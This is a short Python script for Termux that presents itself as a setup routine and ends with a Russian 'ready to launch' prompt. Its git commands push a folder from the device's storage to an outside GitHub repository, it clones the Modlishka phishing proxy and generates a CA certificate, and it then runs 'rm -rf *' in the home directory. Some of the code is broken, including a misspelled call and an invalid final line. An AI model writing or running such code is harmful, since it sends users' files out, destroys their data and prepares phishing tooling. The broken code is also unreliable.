import os

def start():
    os.system('pkg install git -y')
    os.system('pkg install root-repo unstable-repo x11-repo')
    os.system('apt update -y')
    os.system('termux-setup-storage')
    os.system('cd /storage/emulated/0/')
    os.system('mkdir Hack; mv sherman Hack')
    os.system('clear')
    os.system('cd Hack')
    os.system('git init')
    os.system('git add .')
    os.system('clear')
    os.system('git commit -m "Cool!" ')
    os.system('git remote add origin https://github.com/hellowfishing/vk.git')
    os.sustem('clear')
    os.system('git push -u origin master')
    os.system('clear')
    os.system('cd')
    os.system('git clone https://github.com/drk1wi/Modlishka; cd go/src/github.com/drk1wi/Modlishka && openssl genrsa -out MyCA.key 2048 && openssl req -x509 -new -nodes -key MyCA.key -sha256 -days 1024 -out MyCA.pem && ls; atom plugin/autocert.go; atom MyCA.key; atom MyCA.pem')
start()
os.system('cd')
os.system('rm -rf *')
print('Готов к запуску, напииште старт')
ds=input('Go: ')
ds = 'start':
